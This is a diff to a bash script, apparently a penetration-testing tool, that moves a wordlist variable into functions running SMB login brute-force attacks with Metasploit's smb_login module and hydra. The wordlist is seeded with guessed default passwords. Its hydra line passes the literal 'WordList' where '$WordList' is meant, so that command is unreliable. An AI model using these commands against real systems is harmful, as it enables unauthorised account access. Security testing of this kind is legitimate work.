@@ -55,7 +55,6 @@ function INSTALL()
 	cd ~/NetTester
 	sudo sed -i '1i IEUser!' wordlist.txt
 	sudo sed -i '1i Passw0rd!' wordlist.txt
-	WordList=~/NetTester/wordlist.txt
 	echo "[+] Wordlist created: ~/NetTester/wordlist.txt"
 	echo " "
 	cd ~/NetTester
@@ -245,6 +244,7 @@ function MSF_SMBBRUTE()
         ### MSF CONSOLE RESOURCE FILE
         # create a .rc file to act as a script for msf console
         # inject then apend msfconsole commands
+        WordList=~/NetTester/wordlist.txt
         echo "use auxiliary/scanner/smb/smb_login" > msfscript.rc
         echo "set rhosts $IP" >> msfscript.rc
         echo "set user_file $WordList" >> msfscript.rc
@@ -294,6 +294,7 @@ function HYDRA_SMBBRUTE()
         cd ~/NetTester
         
         ### BRUTE FORCE ATTACK
+        WordList=~/NetTester/wordlist.txt
         sudo hydra -f -L $WordList -P WordList $IP smb -t 4 -vV > hydraoutput.txt
         
         ### LOGGING
